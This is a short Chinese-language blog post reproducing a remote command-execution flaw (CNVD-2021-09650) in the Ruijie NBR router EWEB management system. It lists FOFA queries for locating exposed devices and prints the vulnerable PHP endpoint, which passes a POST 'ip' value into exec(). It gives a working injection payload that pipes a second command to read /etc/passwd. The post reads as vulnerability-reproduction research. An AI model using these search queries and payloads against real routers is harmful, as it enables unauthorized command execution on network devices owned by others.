---
title: Ruijie-NBR-router-RCE
tags:
  - vuln
categories:
  - 漏洞复现
copyright: true
abbrlink: 43bd18b
date: 2021-07-12 23:44:55
---

![](https://z3.ax1x.com/2021/07/13/WFHmrV.jpg)

<!--more-->

锐捷NBR路由器 EWEB网管系统 远程命令执行漏洞 CNVD-2021-09650

HW漏洞，锐捷NBR路由器 EWEB网管系统部分接口存在命令注入

**验证**

fofa  `title="锐捷网络-EWEB网管系统"` 或者 `icon_hash="-692947551"`

登录页面这样子：

![img](https://z3.ax1x.com/2021/07/13/WFHRZ8.png)

出现漏洞的文件在 `/guest_auth/guestIsUp.php`

```php
<?php
    //查询用户是否上线了
    $userip = @$_POST['ip'];
    $usermac = @$_POST['mac'];

    if (!$userip || !$usermac) {
        exit;
    }
    /* 判断该用户是否已经放行 */
    $cmd = '/sbin/app_auth_hook.elf -f ' . $userip;
    $res = exec($cmd, $out, $status);
    /* 如果已经上线成功 */
    if (strstr($out[0], "status:1")) {
        echo 'true';
    }
?>
```

可以通过命令拼接的方式构造命令执行，如：`ip=127.0.01 | cat /etc/passwd`

![img](https://z3.ax1x.com/2021/07/13/WFHWdS.png)

**Reference**

http://wiki.peiqi.tech/PeiQi_Wiki/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7NBR%E8%B7%AF%E7%94%B1%E5%99%A8%20EWEB%E7%BD%91%E7%AE%A1%E7%B3%BB%E7%BB%9F%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CNVD-2021-09650.html

